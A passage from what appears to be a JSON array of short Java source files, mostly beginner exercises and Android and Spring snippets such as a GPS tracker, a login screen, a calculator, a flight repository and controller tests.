}\r\n\r\n    /**\r\n     * @param player a string that represents the player\r\n     * @return true diagonal win condition\r\n     */\r\n    private static boolean isDiagonalWin(String player) { \r\n        if ((board[0][0].equals(player) && board[1][1].equals(player) && board[2][2].equals(player)) ||\r\n                (board[0][2].equals(player) && board[1][1].equals(player) && ",
    "import java.util.*;\n\npublic class HashMapDemo {\n\n    public static void main (String[] args){\n\n        Student stud1 = new Student();\n        stud1.setStudentNumber(\"1234\");\n        stud1.setLastName(\"Dela Cruz\");\n        stud1.setFirstName(\"Juan\");\n        stud1.setProgramCode(\"BSCS\");\n\n        Student stud2 = new Student();\n        stud2.setStudentNumber(\"5678\");\n        stud2.setLastName(\"Santos\");\n        stud2.setFirstName(\"Maria\");\n        stud2.setProgramCode(\"BSIT\");\n\n        Student stud3 = new Student();\n        stud3.setStudentNumber(\"9876\");\n        stud3.setLastName(\"Hernandez\");\n        stud3.setFirstName(\"Olivia\");\n        stud3.setProgramCode(\"BSEMC\");\n\n\n        HashMap <String, Student> studentMap = new HashMap<>();\n\n        //use studNo(unique value) as the key of the hashmap\n        studentMap.put(stud1.getStudentNumber(), stud1);\n        studentMap.put(stud2.getStudentNumber(), stud2);\n        studentMap.put(stud3.getStudentNumber(), stud3);\n\n        //extract its value\n\n        for(Map.Entry<String, Student> entryMap : studentMap.entrySet()){\n\n            System.out.println(\"Student number is \"+entryMap.getValue().getStudentNumber());\n            System.out.println(\"Name is \"+ entryMap.getValue().getLastName() + \", \"+ entryMap.getValue().getFirstName());\n            System.out.println(\"Program is \"+ entryMap.getValue().getProgramCode()+ \"\\n\");\n        }\n    }\n}\n",
    "package com.sp.android_studio_project;\n\nimport android.Manifest;\nimport android.app.Service;\nimport android.content.Context;\nimport android.content.DialogInterface;\nimport android.content.Intent;\nimport android.content.pm.PackageManager;\nimport android.location.Location;\nimport android.location.LocationListener;\nimport android.location.LocationManager;\nimport android.net.Uri;\nimport android.os.Bundle;\nimport android.os.IBinder;\nimport android.provider.Settings;\n\nimport androidx.appcompat.app.AlertDialog;\nimport androidx.core.app.ActivityCompat;\n\npublic class GPSTracker extends Service implements LocationListener{\n    private Context mContext = null;\n    boolean isGPSEnabled = false;\n    boolean isNetworkEnabled = false;\n    boolean canGetLocation = false;\n\n    Location location;\n    double latitude;\n    double longitude;\n\n    //The min distance to change Updates in meters\n    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10;\n    //The min time between updates in ms\n    private static final long MIN_TIME_BW_UPDATES = 1000*60*1;\n    //Declaring a location manager\n    protected LocationManager locationManager;\n\n    public GPSTracker() { checkGPSPermissions(); }\n\n    public GPSTracker(Context context) {\n        this.mContext = context;\n        checkGPSPermissions();\n    }\n\n    public Location getLocation() {\n        this.canGetLocation = false;\n        try {\n            locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);\n            //getting GPS status\n            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);\n            //getting network status\n            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);\n            if(!isGPSEnabled && !isNetworkEnabled){\n                //no network, prompt user to enable\n                showEnableLocationAlert();\n            }else{\n                this.canGetLocation = true;\n                if (isNetworkEnabled) {\n                    //permission granted\n                    locationManager.requestLocationUpdates(\n                            LocationManager.NETWORK_PROVIDER,\n                            MIN_TIME_BW_UPDATES,\n                            MIN_DISTANCE_CHANGE_FOR_UPDATES,this);\n                    if (locationManager != null){\n                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);\n                        if(location != null){\n                            latitude = location.getLatitude();\n                            longitude = location.getLongitude();\n                        }\n                    }\n                }\n\n                if (isGPSEnabled) {\n                    if (location == null){\n                        locationManager.requestLocationUpdates(\n                                LocationManager.GPS_PROVIDER,\n                                MIN_TIME_BW_UPDATES,\n                                MIN_DISTANCE_CHANGE_FOR_UPDATES, this);\n                        if (locationManager != null){\n                            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);\n                            if (location != null) {\n                                latitude = location.getLatitude();\n                                longitude = location.getLongitude();\n                            }\n                        }\n                    }\n                }\n            }\n        }catch (SecurityException e) {\n            e.printStackTrace();\n        }\n        return location;\n    }\n\n    //Function to get latitude\n    public double getLatitude() {\n        if (location != null) {\n            latitude = location.getLatitude();\n        }\n        return latitude;\n    }\n\n\n    //Function to get longitude\n    public double getLongitude() {\n        if (location != null) {\n            longitude = location.getLongitude();\n        }\n        return longitude;\n    }\n\n    /* stop using GPS listener\n    calling this function will stop using GPS in app\n     */\n\n    public void stopUsingGPS() {\n        if (locationManager != null){\n            locationManager.removeUpdates(GPSTracker.this);\n        }\n    }\n\n    /*\n    function to check GPS/wifi\n    return Boolean\n     */\n    public boolean canGetLocation() {\n        checkGPSPermissions();\n        return canGetLocation;\n    }\n\n    //check for location permission\n    public void checkGPSPermissions() {\n        int permissionState1 = ActivityCompat.checkSelfPermission(mContext,\n                Manifest.permission.ACCESS_FINE_LOCATION);\n        int permissionState2 = ActivityCompat.checkSelfPermission(mContext,\n                Manifest.permission.ACCESS_COARSE_LOCATION);\n        if (permissionState1 == PackageManager.PERMISSION_GRANTED &&\n                permissionState2 == PackageManager.PERMISSION_GRANTED){\n            //permission granted, get gps location\n            getLocation();\n        }\n        else{\n            //prompt user to enable locati",
    "package br.com.trikwcc.prova1;\n\nimport android.content.Intent;\nimport android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\npublic class LoginPage extends AppCompatActivity implements View.OnClickListener {\n    private int errors = 3;\n    private SharedPreferences sharedPref;\n    private EditText usernametxt, passwordtxt;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.login_screen);\n        if (errors == 0) {\n            lockApp();\n            finish();\n        }\n\n        sharedPref = getSharedPreferences(\"myPrefs\", MODE_PRIVATE);\n        usernametxt = findViewById(R.id.Username);\n        passwordtxt = findViewById(R.id.Password);\n\n        Button clearButton = findViewById(R.id.cancel_login);\n        Button configButton = findViewById(R.id.config_login);\n        Button loginButton = findViewById(R.id.login_button);\n\n        clearButton.setOnClickListener(this);\n        configButton.setOnClickListener(this);\n        loginButton.setOnClickListener(this);\n    }\n\n    @Override\n    public void onClick(View view) {\n        int id = view.getId();\n        if (id == R.id.login_button) {\n            checkAccount();\n        }\n        if (id == R.id.cancel_login) {\n            clearFields();\n        }\n        if (id == R.id.config_login) {\n            Intent c = new Intent (this, ConfigPage.class);\n            startActivity(c);\n        }\n    }\n\n    private void checkAccount() {\n        if (errors == 0) {\n            lockApp();\n            finish();\n            return;\n        }\n\n        String usuarioSalvo = sharedPref.getString(\"username\", \"\");\n        String senhaSalva = sharedPref.getString(\"password\", \"\");\n\n        String username = usernametxt.getText().toString().trim();\n        String password = passwordtxt.getText().toString().trim();\n\n        if (username.isEmpty() || password.isEmpty()) {\n            showToast(\"Nenhum campo pode ficar vazio\");\n            return;\n        }\n\n        if (!password.equals(senhaSalva)) {\n            showToast(\"Senha inv\u00e1lida: \" + errors);\n            errors--;\n        }\n\n        if (username.equals(usuarioSalvo) && password.equals(senhaSalva)) {\n            showToast(\"Login aceito\");\n            errors = 3;\n            SharedPreferences.Editor editor = sharedPref.edit();\n            editor.putInt(\"errors\", errors);\n            editor.apply();\n            startActivity(new Intent(this, MainActivity.class));\n        }\n    }\n\n\n    private void clearFields() {\n        usernametxt.setText(\"\");\n        passwordtxt.setText(\"\");\n    }\n\n    private void lockApp() {\n        showToast(getString(R.string.app_lock));\n        usernametxt.setEnabled(false);\n        passwordtxt.setEnabled(false);\n        SharedPreferences.Editor editor = sharedPref.edit();\n        editor.putInt(\"errors\", errors);\n        editor.apply();\n    }\n\n    private void showToast(String message) {\n        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();\n    }\n}\n",
    "import java.util.Arrays;\n\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Letter T Array\");\n        int[] input1 = {1,2,3,4,5};\n        int[] input2 = {4,1,3,2};\n\n        int[] output1 = letterTarray(input1);\n        int[] output2 = letterTarray(input2);\n\n        System.out.println(\"Input:\");\n        System.out.println(Arrays.toString(input1));\n        System.out.println(Arrays.toString(input2));\n        System.out.println(\"Output:\");\n        System.out.println(Arrays.toString(output1));\n        System.out.println(Arrays.toString(output2));\n    }\n\n\n\n    public static int[] letterTarray(int[] array) {\n        int lengthArray = array.length;\n        int[] newArray = new int[lengthArray];\n\n        int rightIndex = lengthArray - 1;\n        int leftIndex = 0;\n\n        // untuk menandakan arah penambahan data\n        boolean right = true;\n        for (int i = 0; i < lengthArray; i++) {\n            if (right) {\n                // masukkan data dari kanan\n                newArray[rightIndex] = array[i];\n                rightIndex--;\n            } else {\n                // masukkan data dari kiri\n                newArray[leftIndex] = array[i];\n                leftIndex++;\n            }\n            // ganti arah\n            right = !right;\n        }\n\n        return newArray;\n    }\n}\n",
    "package com.sist.web.dao;\n\nimport java.util.List;\n\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.Query;\nimport org.springframework.data.repository.query.Param;\n\nimport com.sist.web.entity.FoodEntity;\nimport com.sist.web.entity.StayDetail;\n\n\npublic interface StayDAO extends JpaRepository<StayDetail, Integer>{\n\t\n\t @Query(value=\"SELECT * FROM stay \"\n\t\t\t +\"ORDER BY sno ASC LIMIT :start,12\",nativeQuery = true)\n\t   public List<StayDetail> stayListData(@Param(\"start\") Integer start);\n\t \n\t @Query(value=\"SELECT CEIL(COUNT(*)/12.0) FROM stay \"\n\t\t\t ,nativeQuery = true)\n\t   public int stayListTotalPage();\n\t \n\t public StayDetail findBySno(int sno);\n\t \n\t \n\t @Query(value=\"SELECT * FROM stay \"\n\t\t\t +\"WHERE detail_address LIKE CONCAT('%',:detail_address,'%') \"\n\t\t\t +\"ORDER BY sno ASC LIMIT :start,12\",nativeQuery = true)\n\t   public List<StayDetail> stayFindData(@Param(\"start\") Integer start,@Param(\"detail_address\") String detail_address);\n\t \n\t @Query(value=\"SELECT CEIL(COUNT(*)/12.0) FROM stay \"\n\t\t\t +\"WHERE detail_address LIKE CONCAT('%',:detail_address,'%')\",nativeQuery = true)\n\t   public int stayFindTotalPage(@Param(\"detail_address\") String detail_address);\n\t \n\t \n\t @Query(value=\"SELECT * FROM stay \"\n\t\t\t +\"ORDER BY hit DESC LIMIT 0,12\",nativeQuery = true)\n\t   public List<StayDetail> stayMainData();\n}\n",
    "package com.amigos.test;\r\n\r\n\r\n\r\n//import com.amigos.models.Player;\r\nimport com.amigos.utiles.PlayersUtils;\r\n\r\npublic class PlayerManagementSystem {\r\n\t//private static Scanner scanner = new Scanner(System.in);\r\n\t//initial phase of players arrays =size =0;\r\n\t//private static Player[] players= new Player[0];\r\n\t\r\n\t//we will use Array.copyOf\r\n\tpublic static void main(String[] args) \r\n\t{\r\n\t\t\r\n\t\t\r\n\t\r\n\t\twhile(true)\r\n\t\t{\r\n\t\t\tSystem.out.println(\"==========================================\");\r\n\t\t\tSystem.out.println(\"Player Mananagement System Menu::\");\r\n\t\t\tSystem.out.println(\"1.Add Player\");\r\n\t\t\tSystem.out.println(\"2.Remove Player\");\r\n\t\t\tSystem.out.println(\"3.Search Player\");\r\n\t\t\tSystem.out.println(\"4.Upadate Player\");\r\n\t\t\tSystem.out.println(\"5.Display Sorted Players\");\r\n\t\t\tSystem.out.println(\"6.Diaplay All Players\");\r\n\t\t\tSystem.out.println(\"7.Exit\");\r\n\t\t\tSystem.out.println(\"==========================================\");\r\n\t\t\tint choice=PlayersUtils.getUserChoice();\r\n\t\t\tswitch(choice) {\r\n\t\t\tcase 1:\r\n\t\t\t\tPlayersUtils.addNewPlayer();\r\n\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\tPlayersUtils.removePlayer();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\tPlayersUtils.searchPlayer();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 4:\r\n\t\t\t\t\tPlayersUtils.updatePlayer();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 5:\r\n\t\t\t\t\tPlayersUtils.displaySortedPlayers();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 6:\r\n\t\t\t\t\tPlayersUtils.displayAllPlayers();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 7:\r\n\t\t\t\t\tPlayersUtils.scannerClosed();\r\n\t\t\t\t\tSystem.out.println(\"Exiting players management system...\");\r\n\t\t\t\t\tSystem.exit(choice);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t}\t\r\n\t\t}\r\n \r\n\t\r\n\r\n\r\n\r\n\t\r\n}\r\n",
    "package org.example;\n\npublic class Service {\n    public boolean isEven(int input) {\n        return input % 2 == 0;\n    }\n\n    public void highComplexityMethod(int a, int b, int c) {\n        if (a == 0) {\n            System.out.println(\"a is positive\");\n            if (b > 0) {\n                System.out.println(\"b is positive\");\n                if (c > 0) {\n                    System.out.println(\"c is positive\");\n                } else {\n                    System.out.println(\"c is non-positive\");\n                }\n            } else {\n                System.out.println(\"b is non-positive\");\n                if (c > 0) {\n                    System.out.println(\"c is positive\");\n                } else {\n                    System.out.println(\"c is non-positive\");\n                }\n            }\n        } else if (a < 0) {\n            System.out.println(\"a is non-positive\");\n            if (b > 0) {\n                System.out.println(\"b is positive\");\n                if (c > 0) {\n                    System.out.println(\"c is positive\");\n                } else {\n                    System.out.println(\"c is non-positive\");\n                }\n            } else {\n                System.out.println(\"b is non-positive\");\n                if (c > 0) {\n                    System.out.println(\"c is positive\");\n                } else {\n                    System.out.println(\"c is non-positive\");\n                }\n            }\n        } else {\n            System.out.println(\"a is non-positive\");\n            if (b > 0) {\n                System.out.println(\"b is positive\");\n                if (c > 0) {\n                    System.out.println(\"c is positive\");\n                } else {\n                    System.out.println(\"c is non-positive\");\n                }\n            } else {\n                System.out.println(\"b is non-positive\");\n                if (c > 0) {\n                    System.out.println(\"c is positive\");\n                } else {\n                    System.out.println(\"c is non-positive\");\n                }\n            }\n        }\n    }\n}\n",
    "package com.airline.flight;\r\n\r\nimport java.io.BufferedReader;\r\nimport java.io.FileNotFoundException;\r\nimport java.io.FileReader;\r\nimport java.io.IOException;\r\nimport java.time.LocalDateTime;\r\nimport java.util.ArrayList;\r\nimport java.util.HashMap;\r\nimport java.util.List;\r\nimport java.util.Map;\r\n\r\npublic class FlightRepository {\r\n    private static Map<String, Flight> flights = new HashMap<>();\r\n    private List<FlightInfoProvider> observers = new ArrayList<>();\r\n\r\n    public FlightRepository() {\r\n        String csvFilePath = \"data/flight.csv\";\r\n        try (BufferedReader br = new BufferedReader(new FileReader(csvFilePath))) {\r\n            String line;\r\n            boolean isFirstLine = true;\r\n            String[] headers = null;\r\n\r\n            while ((line = br.readLine()) != null) {\r\n                if (isFirstLine) {\r\n                    // Assume the first line contains headers\r\n                    headers = line.split(\",\");\r\n                    isFirstLine = false;\r\n                } else {\r\n                    String[] values = line.split(\",\");\r\n                    Map<String, String> fileDetails = new HashMap<>();\r\n\r\n                    for (int i = 0; i < headers.length; i++) {\r\n                        fileDetails.put(headers[i], values[i]);\r\n                    }\r\n\r\n                    // Create an instance of Passenger and add it to the map\r\n                    Flight flight = new Flight(\r\n                            fileDetails.get(\"flightCode\"),\r\n                            fileDetails.get(\"destination\"),\r\n                            LocalDateTime.parse(fileDetails.get(\"departureTime\")),\r\n                            fileDetails.get(\"carrier\"),\r\n                            Integer.parseInt(fileDetails.get(\"capacity\")),\r\n                            Double.parseDouble(fileDetails.get(\"allowedBaggageWeight\")),\r\n                            Double.parseDouble(fileDetails.get(\"allowedBaggageVolume\")),\r\n                            Double.parseDouble(fileDetails.get(\"maxBaggageWeight\")),\r\n                            Double.parseDouble(fileDetails.get(\"maxBaggageVolume\")),\r\n                            Double.parseDouble(fileDetails.get(\"excessBaggageFee\")),\r\n                            Integer.parseInt(fileDetails.get(\"totalCheckedIn\")),\r\n                            Double.parseDouble(fileDetails.get(\"totalBaggageWeight\")),\r\n                            Double.parseDouble(fileDetails.get(\"totalBaggageVolume\")),\r\n                            Double.parseDouble(fileDetails.get(\"totalCollectedExcessBaggageFee\"))\r\n                    );\r\n                    // Assume flightCode is unique and used as the key\r\n                    flights.put(fileDetails.get(\"flightCode\"), flight);\r\n                }\r\n            }\r\n        } catch (FileNotFoundException e) {\r\n            throw new RuntimeException(e);\r\n        } catch (IOException e) {\r\n            throw new RuntimeException(e);\r\n        }\r\n    }\r\n\r\n    public Flight findByFlightCode(String flightCode) {\r\n        // Search for a flight by its flight code\r\n        for (Map.Entry<String, Flight> entry : flights.entrySet()) {\r\n            if (entry.getKey().equals(flightCode)) {\r\n                return entry.getValue(); // Return the flight if found\r\n            }\r\n        }\r\n        return null; // Return null if the flight with the given flight code is not found\r\n    }\r\n\r\n    public Map<String, Flight> getFlights() {\r\n        return flights; // Return the map of flights\r\n    }\r\n\r\n    public void updateFlightInfo(String flightCode, Double baggageVolume, Double baggageWeight, Double chargeFee) {\r\n        // Update flight information with the provided data\r\n        Flight flightInfo = findByFlightCode(flightCode); // Find the flight by its flight code\r\n        if (flightInfo != null) {\r\n            // Update the flight's total collected excess baggage fee, total baggage weight, total baggage volume, and total checked-in passengers\r\n            flightInfo.setTotalCollectedExcessBaggageFee(chargeFee);\r\n            flightInfo.setTotalBaggageWeight(baggageWeight);\r\n            flightInfo.setTotalBaggageVolume(baggageVolume);\r\n            flightInfo.setTotalCheckedIn();\r\n        }\r\n    }\r\n\r\n    public int getTotalCheckedInPassengers(String flightCode) {\r\n        // Get the total number of checked-in passengers for a specific flight\r\n        Flight flight = findByFlightCode(flightCode); // Find the flight by its flight code\r\n        if (flight != null) {\r\n            return flight.getTotalCheckedIn(); // Return the total number of checked-in passengers if the flight is found\r\n        } else {\r\n            return 0; // Return 0 if the flight with the given code was not found\r\n        }\r\n    }\r\n}",
    "package com.example.androidprojectcollection;\n\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.TextView;\nimport java.text.DecimalFormat;\nimport java.util.Stack;\n\npublic class Calculator extends MainActivity3Calc {\n    \n        public double evaluateExpression (String expression){\n\n            String[] tokens = expression.split(\"(?=[+\\\\-x/])|(?<=[+\\\\-x/])\");\n\n\n            double result = Double.parseDouble(tokens[0]);\n            char operator = ' ';\n\n\n            for (int i = 1; i < tokens.length; i++) {\n\n                if (tokens[i].matches(\"[+\\\\-x/]\")) {\n                    operator = tokens[i].charAt(0);\n                } else {\n\n                    double operand = Double.parseDouble(tokens[i]);\n                    switch (operator) {\n                        case '+':\n                            result += operand;\n                            break;\n                        case '-':\n                            result -= operand;\n                            break;\n                        case 'x':\n                            result *= operand;\n                            break;\n                        case '/':\n\n                            if (operand == 0) {\n                                throw new ArithmeticException(\"Division by zero\");\n                            }\n                            result /= operand;\n                            break;\n                    }\n                }\n            }\n            return result;\n        }\n\n        public String formatResult ( double result){\n            // Check if the result has decimal places\n            if (result == (long) result) {\n                // If the result is an integer, remove the decimal part\n                return String.format(\"%d\", (long) result);\n            } else {\n\n                DecimalFormat decimalFormat = new DecimalFormat(\"#.##########\");\n                return decimalFormat.format(result);\n            }\n        }\n\n\n\n        public void updateResult (MainActivity3Calc m) {\n            String expression = m.display.getText().toString();\n            if (expression.contains(\"+\") || expression.contains(\"-\") || expression.contains(\"x\") || expression.contains(\"/\")) {\n                try {\n                    double result = evaluateExpression(expression);\n                    String formattedResult = formatResult(result);\n                    m.eqView.setText(formattedResult);\n                } catch (Exception e) {\n                    m.eqView.setText(\"\");\n                }\n            } else {\n                m.eqView.setText(\"\");\n            }\n        }\n\n    public Double ActualResult (String expression){\n        expression = expression.replaceAll(\"\\\\s+\", \"\");\n\n\n        String[] tokens = expression.split(\"(?<=[-+x/()])|(?=[-+x/()])\");\n\n\n        Stack<Double> numbers = new Stack<>();\n        Stack<Character> operators = new Stack<>();\n\n\n        for (String token : tokens) {\n\n            if (token.matches(\"[0-9]+\")) {\n                numbers.push(Double.parseDouble(token));\n            } else if (token.equals(\"(\")) {\n                operators.push(token.charAt(0));\n            } else if (token.equals(\")\")) {\n\n                while (!operators.isEmpty() && operators.peek() != '(') {\n                    evaluateOperator(numbers, operators);\n                }\n                operators.pop(); // Remove the '('\n            } else {\n                while (!operators.isEmpty() && Precedence(token.charAt(0), operators.peek())) {\n                    evaluateOperator(numbers, operators);\n                }\n                operators.push(token.charAt(0));\n            }\n        }\n\n        while (!operators.isEmpty()) {\n            evaluateOperator(numbers, operators);\n        }\n        return numbers.pop();\n\n    }\n\n    public void evaluateOperator (Stack < Double > numbers, Stack < Character > operators){\n        char operator = operators.pop();\n        double num2 = numbers.pop();\n        double num1 = numbers.pop();\n        double result;\n        switch (operator) {\n            case '+':\n                result = num1 + num2;\n                break;\n            case '-':\n                result = num1 - num2;\n                break;\n            case 'x':\n                result = num1 * num2;\n                break;\n            case '/':\n                if (num2 == 0) {\n                    throw new ArithmeticException(\"Division by zero\");\n                }\n                result = num1 / num2;\n                break;\n            default:\n                throw new IllegalArgumentException(\"Invalid operator\");\n        }\n        numbers.push(result);\n    }\n\n    public boolean Precedence(char op1, char op2) {\n        if (op2 == '(' || op2 == ')') {\n            return false;\n        }\n        return (op1 != 'x' && op1 != '/') || (op2 != '+' && op2 != '-');\n    }\n\n\n    }\n\n",
    "package com.ontariotechu.sofe3980U;\n\nimport org.junit.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;\nimport org.springframework.test.web.servlet.MockMvc;\n\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;\nimport org.springframework.test.web.servlet.result.MockMvcResultMatchers;\nimport org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;\n\nimport org.junit.runner.RunWith;\n\nimport org.junit.*;\nimport org.junit.runner.*;\nimport org.springframework.beans.factory.annotation.*;\nimport org.springframework.boot.test.context.*;\nimport org.springframework.boot.test.mock.mockito.*;\nimport org.springframework.test.context.junit4.*;\n\nimport static org.hamcrest.Matchers.containsString;\n\nimport static org.assertj.core.api.Assertions.*;\nimport static org.mockito.BDDMockito.*;\n\n@RunWith(SpringRunner.class)\n@WebMvcTest(HelloAPIController.class)\npublic class HelloAPIControllerTest {\n\n    @Autowired\n    private MockMvc mvc;\n\n\n    @Test\n    public void helloAPINoParameter() throws Exception {\n        this.mvc.perform(get(\"/helloAPI\"))\n            .andExpect(status().isOk())\n\t\t\t.andExpect(content().string(\"Hello World!\"));\n    }\n\t\n\t@Test\n\tpublic void helloAPIWithName() throws Exception {\n        this.mvc.perform(get(\"/helloAPI\").param(\"name\",\"John\"))\n            .andExpect(status().isOk())\n\t\t\t.andExpect(content().string(\"Hello John!\"));\n    }\n\t\n\t@Test\n    public void EmailAPINoParameters() throws Exception {\n        this.mvc.perform(get(\"/emailAPI\"))\n            .andExpect(status().isOk())\n            .andExpect(MockMvcResultMatchers.jsonPath(\"$.name\").value(\"John Doe\"))\n\t\t\t.andExpect(MockMvcResultMatchers.jsonPath(\"$.suggestedEmail\").value(\"John.Doe@OntarioTechU.net\"));\n    }\n\t\n\t@Test\n    public void EmailAPIWithFirstName() throws Exception {\n        this.mvc.perform(get(\"/emailAPI\").param(\"fname\",\"Jack\"))\n            .andExpect(status().isOk())\n            .andExpect(MockMvcResultMatchers.jsonPath(\"$.name\").value(\"Jack Doe\"))\n\t\t\t.andExpect(MockMvcResultMatchers.jsonPath(\"$.suggestedEmail\").value(\"Jack.Doe@OntarioTechU.net\"));\n    }\n\t\n\t@Test\n    public void EmailAPIWithLastName() throws Exception {\n        this.mvc.perform(get(\"/emailAPI\").param(\"lname\",\"Sparrow\"))\n            .andExpect(status().isOk())\n            .andExpect(MockMvcResultMatchers.jsonPath(\"$.name\").value(\"John Sparrow\"))\n\t\t\t.andExpect(MockMvcResultMatchers.jsonPath(\"$.suggestedEmail\").value(\"John.Sparrow@OntarioTechU.net\"));\n    }\n\t\n\t@Test\n    public void EmailAPIWithFullName() throws Exception {\n        this.mvc.perform(get(\"/emailAPI\").param(\"fname\",\"Jack\").param(\"lname\",\"Sparrow\"))\n            .andExpect(status().isOk())\n            .andExpect(MockMvcResultMatchers.jsonPath(\"$.name\").value(\"Jack Sparrow\"))\n\t\t\t.andExpect(MockMvcResultMatchers.jsonPath(\"$.suggestedEmail\").value(\"Jack.Sparrow@OntarioTechU.net\"));\n    }\n}",
    "package Module2;\r\n\r\nimport java.util.Scanner; // Import Scanner class\r\n\r\n//Custom exception class for binary format exception\r\nclass BinaryFormatException extends Exception {\r\n\r\n/**\r\n\t * \r\n\t */\r\n\tprivate static final long serialVersionUID = 1L;\r\n\r\npublic BinaryFormatException(String message) {\r\n     super(message);\r\n }\r\n\r\n//Define BinaryConverter class\r\n // Method to convert binary string to decimal\r\n public static int bin2Dec(String binaryString) throws BinaryFormatException {\r\n     // Check if the input string is a valid binary string\r\n     for (int i = 0; i < binaryString.length(); i++) {\r\n         char ch = binaryString.charAt(i);\r\n         if (ch != '0' && ch != '1') {\r\n             throw new BinaryFormatException(\"Not a binary number\");\r\n         }\r\n     }\r\n\r\n     // Convert binary string to decimal\r\n     int decimal = Integer.parseInt(binaryString, 2);\r\n     return decimal;\r\n }\r\n\r\n // Test program\r\n public static void main(String[] args) {\r\n     Scanner scanner = new Scanner(System.in);\r\n     System.out.print(\"Enter a binary number: \");\r\n     String binaryString = scanner.nextLine();\r\n\r\n     try {\r\n         int decimal = bin2Dec(binaryString);\r\n         System.out.println(\"Decimal equivalent: \" + decimal);\r\n     } catch (BinaryFormatException e) {\r\n         System.out.println(e.getMessage());\r\n     } finally {\r\n         scanner.close();\r\n     }\r\n }\r\n}",
    "package cn.zyy.nettyserver;\n\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.util.CharsetUtil;\n\npublic class ServerHandler extends ChannelInboundHandlerAdapter {\n\t@Override\n\tpublic void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n\t\tSystem.out.println(\"\u670d\u52a1\u5668\u8bfb\u53d6\u7ebf\u7a0b \" + Thread.currentThread().getName() + \" channel =\" + ctx.channel());\n\t\tSystem.out.println(\"server ctx =\" + ctx);\n\t\tSystem.out.println(\"\u770b\u770bchannel \u548c pipeline\u7684\u5173\u7cfb\");\n\t\tChannel channel = ctx.channel();\n\t\tChannelPipeline pipeline = channel.pipeline();\n\n\t\tByteBuf buf = (ByteBuf) msg;\n\t\tSystem.out.println(\"\u5ba2\u6237\u7aef\u53d1\u9001\u6d88\u606f\u662f:\" + buf.toString(CharsetUtil.UTF_8));\n\t\tSystem.out.println(\"\u5ba2\u6237\u7aef\u5730\u5740:\" + channel.remoteAddress());\n\t}\n\n\t@Override\n\tpublic void channelReadComplete(ChannelHandlerContext ctx) throws Exception {\n\t\tctx.writeAndFlush(Unpooled.copiedBuffer(\"hello, \u5ba2\u6237\u7aef~(>^\u03c9^<)\u55b51\", CharsetUtil.UTF_8));\n\t}\n\n\t@Override\n\tpublic void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n\t\tctx.close();\n\t}\n}\n",
    "package dto;\n\nimport java.io.Serializable;\n\npublic class Product implements Serializable{\n\n\tprivate static final long serialVersionUID = -4274700572038677000L;\n\t\n\tprivate String productId;\n\tprivate String pname;\n\tprivate Integer unitPrice;\n\tprivate String description;\n\tprivate String manufacturer;\n\tprivate String category;\n\tprivate String condition;\n\tprivate String filename;\n\tprivate int quantity;\n\t\n\tpublic Product() {\n\t\tsuper();\n\t}\n\tpublic Product(String productId, String pname, Integer unitPrice) {\n\t\tsuper();\n\t\tthis.productId = productId;\n\t\tthis.pname = pname;\n\t\tthis.unitPrice = unitPrice;\n\t}\n\tpublic String getProductId() {\n\t\treturn productId;\n\t}\n\tpublic void setProductId(String productId) {\n\t\tthis.productId = productId;\n\t}\n\tpublic String getPname() {\n\t\treturn pname;\n\t}\n\tpublic void setPname(String pname) {\n\t\tthis.pname = pname;\n\t}\n\tpublic Integer getUnitPrice() {\n\t\treturn unitPrice;\n\t}\n\tpublic void setUnitPrice(Integer unitPrice) {\n\t\tthis.unitPrice = unitPrice;\n\t}\n\tpublic String getDescription() {\n\t\treturn description;\n\t}\n\tpublic void setDescription(String description) {\n\t\tthis.description = description;\n\t}\n\tpublic String getManufacturer() {\n\t\treturn manufacturer;\n\t}\n\tpublic void setManufacturer(String manufacturer) {\n\t\tthis.manufacturer = manufacturer;\n\t}\n\tpublic String getCategory() {\n\t\treturn category;\n\t}\n\tpublic void setCategory(String category) {\n\t\tthis.category = category;\n\t}\n\tpublic String getCondition() {\n\t\treturn condition;\n\t}\n\tpublic void setCondition(String condition) {\n\t\tthis.condition = condition;\n\t}\n\tpublic String getFilename() {\n\t\treturn filename;\n\t}\n\tpublic void setFilename(String filename) {\n\t\tthis.filename=filename;\n\t}\n\tpublic int getQuantity() {\n\t\treturn quantity;\n\t}\n\tpublic void setQuantity(int quantity) {\n\t\tthis.quantity=quantity;\n\t}\n}\n",
